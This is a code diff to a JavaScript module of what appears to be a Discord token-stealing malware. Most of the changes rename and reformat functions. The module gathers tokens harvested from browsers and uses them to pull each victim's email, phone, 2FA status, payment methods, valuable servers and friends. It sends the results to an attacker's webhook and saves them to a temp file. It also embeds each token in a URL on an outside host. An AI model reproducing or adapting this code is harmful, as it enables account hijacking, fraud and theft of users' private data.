@@ -5,7 +5,7 @@ const finds = require('./finds.js');
 const fileutil = require('../../utils/fileutil/fileutil.js');
 const requests = require('../../utils/requests/requests.js');
 
-const getRareFlags = (flags) => {
+const GetRareFlags = (flags) => {
     const flagsDict = {
         '<:DiscordEmloyee:1163172252989259898>': 0,
         '<:PartneredServerOwner:1163172304155586570>': 1,
@@ -26,15 +26,15 @@ const getRareFlags = (flags) => {
     }
 
     return result.trim();
-}
+};
 
-const getHQFriends = (friends) => {
+const GetHQFriends = (friends) => {
     const filteredFriends = friends
         .filter(friend => friend.type === 1)
         .map(friend => ({
             username: friend.user.username,
             discriminator: friend.user.discriminator,
-            flags: getRareFlags(friend.user.public_flags)
+            flags: GetRareFlags(friend.user.public_flags)
         }))
 
     let hQFriends = filteredFriends.map(friend => {
@@ -57,7 +57,7 @@ const getHQFriends = (friends) => {
     return `**Rare Friends:**\n${hQFriends}`;
 };
 
-const getHQGuilds = async (guilds, token) => {
+const GetHQGuilds = async (guilds, token) => {
     const filteredGuilds = guilds
         .filter(guild => guild.owner || (guild.permissions & 8) === 8)
         .filter(guild => guild.approximate_member_count >= 500)
@@ -104,20 +104,22 @@ const getHQGuilds = async (guilds, token) => {
 };
 
 
-const getBilling = (billing) => {
+const GetBilling = (billing) => {
     const payment = {
         1: '💳',
         2: '<:Paypal:1129073151746252870>'
     };
     let paymentMethods = billing.map(method => payment[method.type] || '❓').join('');
     return paymentMethods || '`❓`';
-}
+};
 
-const getDate = (current, months) => {
+const GetDate = (current, months) => {
     return new Date(current).setMonth(current.getMonth() + months);
 };
 
-const getNitro = (flags) => {
+const GetNitro = (flags) => {
+    const nitro = '<:DiscordNitro:587201513873473542>';
+
     const monthsNitro = [
         '<:DiscordBoostNitro1:1087043238654906472> ',
         '<:DiscordBoostNitro2:1087043319227494460> ',
@@ -130,27 +132,33 @@ const getNitro = (flags) => {
         '<:DiscordBoostNitro24:1051453776889917530> ',
     ];
 
-    const { premium_type, premium_guild_since } = flags,
-        nitro = '<:DiscordNitro:587201513873473542>';
+    const { premium_type, premium_guild_since } = flags;
     switch (premium_type) {
         default:
             return '`❓`';
         case 1:
             return nitro;
         case 2:
-            if (!premium_guild_since) return nitro;
-            let months = [1, 2, 3, 6, 9, 12, 15, 18, 24],
-                rem = 0;
+            if (!premium_guild_since) {
+                return nitro;
+            };
+
+            let months = [1, 2, 3, 6, 9, 12, 15, 18, 24];
+            let rem = 0;
+
             for (let i = 0; i < months.length; i++)
-                if (Math.round((getDate(new Date(premium_guild_since), months[i]) - new Date()) / 86400000) > 0) {
+                if (Math.round((
+                    GetDate(new Date(premium_guild_since), months[i]) - new Date()
+                ) / 86400000) > 0) {
                     rem = i;
                     break;
-                }
+                };
+
             return `${nitro} ${monthsNitro[rem]}`;
     }
 };
 
-const getFlags = (flags) => {
+const GetFlags = (flags) => {
     const flagsDict = {
         '<:DiscordEmloyee:1163172252989259898>': 0,
         '<:PartneredServerOwner:1163172304155586570>': 1,
@@ -175,10 +183,10 @@ const getFlags = (flags) => {
     }
 
     return result.trim() || '`❓`';
-}
+};
 
 
-const fetch = async (endpoint, headers) => {
+const Fetch = async (endpoint, headers) => {
     const response = await axios.get(`https://discord.com/api/v9/users/${endpoint}`, {
         headers: {
             'Content-Type': 'application/json',
@@ -187,48 +195,36 @@ const fetch = async (endpoint, headers) => {
     });
 
     return response.data;
-}
+};
 
 module.exports = async (webhookUrl) => {
-    const tokens = await finds.getTokens();
+    const tokens = await finds.GetTokens();
     for (const { browser, token } of tokens) {
         try {
-            let user = await fetch('@me', {
+            const user = await Fetch('@me', {
                 'Authorization': token
-            }),
+            });
 
-                profile = await fetch(`${Buffer.from(token.split('.')[0], 'base64').toString('binary')}/profile`, {
-                    'Authorization': token
-                }),
+            const profile = await Fetch(`${Buffer.from(token.split('.')[0], 'base64').toString('binary')}/profile`, {
+                'Authorization': token
+            });
 
-                billing = await fetch(`@me/billing/payment-sources`, {
-                    'Authorization': token
-                }),
+            const billing = await Fetch(`@me/billing/payment-sources`, {
+                'Authorization': token
+            });
 
-                guilds = await fetch(`@me/guilds?with_counts=true`, {
-                    'Authorization': token
-                }),
+            const guilds = await Fetch(`@me/guilds?with_counts=true`, {
+                'Authorization': token
+            });
 
-                friends = await fetch(`@me/relationships`, {
-                    'Authorization': token
-                });
+            const friends = await Fetch(`@me/relationships`, {
+                'Authorization': token
+            });
 
-            const avatarUrlGif = `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.gif`;
-            const avatarUrlPng = `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png`;
+            const ext = user.avatar.startsWith('a_') ? 'gif' : 'png';
+            const avatar = `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.${ext}`;
 
-            let avatar;
-            if (user.avatar) {
-                try {
-                    const avatarResponse = await axios.get(avatarUrlGif);
-                    avatar = avatarResponse.status === 200 ? avatarUrlGif : avatarUrlPng;
-                } catch {
-                    avatar = avatarUrlPng;
-                }
-            } else {
-                avatar = `https://cdn.discordapp.com/embed/avatars/5.png`;
-            }
-
-            let copy = `https://6889-fun.vercel.app/api/aurathemes/raw?data=${token}`;
+            const copy = `https://6889-fun.vercel.app/api/aurathemes/raw?data=${token}`;
 
             const data = {
                 embeds: [
@@ -240,34 +236,34 @@ module.exports = async (webhookUrl) => {
                         fields: [
                             {
                                 name: `<:x:1194495538138185728> ${browser} Token:`,
-                                value:  '```' + token + '```' + '\n' + `[Click Here To Copy Your Token](${copy})`,
+                                value: '```' + token + '```' + '\n' + `[Click Here To Copy Your Token](${copy})`,
                                 inline: false
                             },
                             { name: '\u200b', value: '\u200b', inline: false },
                             {
                                 name: '<a:mail:1245038428891123815> Email:',
-                                value:  '`' + (user.email || '❓') + '`',
+                                value: '`' + (user.email || '❓') + '`',
                                 inline: true
                             },
                             {
                                 name: '<a:phone:1104204812867874936> Phone:',
-                                value:  '`' + (user.phone || '❓') + (user.mfa_enabled ? ' (2FA)' : '') + '`',
+                                value: '`' + (user.phone || '❓') + (user.mfa_enabled ? ' (2FA)' : '') + '`',
                                 inline: true
                             },
                             { name: '\u200b', value: '\u200b', inline: false },
                             {
                                 name: '<a:nitro:1122755911967068210> Nitro:',
-                                value: getNitro(profile),
+                                value: GetNitro(profile),
                                 inline: true
                             },
                             {
                                 name: '<:billing:1122678162288037929> Billing:',
-                                value: getBilling(billing),
+                                value: GetBilling(billing),
                                 inline: true
                             },
                             {
                                 name: '<a:badges:1138323945284714516> Badges:',
-                                value: getFlags(user.public_flags),
+                                value: GetFlags(user.public_flags),
                                 inline: true
                             },
                         ]
@@ -275,7 +271,7 @@ module.exports = async (webhookUrl) => {
                 ]
             };
 
-            const hqGuilds = await getHQGuilds(guilds, token);
+            const hqGuilds = await GetHQGuilds(guilds, token);
             if (hqGuilds) {
                 data.embeds[0].fields.push({
                     name: '\u200b',
@@ -284,7 +280,7 @@ module.exports = async (webhookUrl) => {
                 });
             };
 
-            const hqFriends = getHQFriends(friends);
+            const hqFriends = GetHQFriends(friends);
             if (hqFriends) {
                 data.embeds[0].fields.push({
                     name: '\u200b',
@@ -293,7 +289,7 @@ module.exports = async (webhookUrl) => {
                 });
             };
 
-            await requests.webhook(webhookUrl, data, [], copy);
+            await requests.Webhook(webhookUrl, data, [], copy);
 
             const tokenInfo = [
                 `Token: ${token}`,
@@ -305,12 +301,12 @@ module.exports = async (webhookUrl) => {
             ];
 
             const WishTempDir = fileutil.WishTempDir('tokens');
-            await fileutil.writeDataToFile(WishTempDir, `tokenInfo-${user.id}.txt`, tokenInfo);
-            
+            await fileutil.WriteDataToFile(WishTempDir, `tokenInfo-${user.id}.txt`, tokenInfo);
+
         } catch (error) {
             if (error.response && error.response.data.code === 0) {
                 continue;
             }
         }
     }
-}
+};
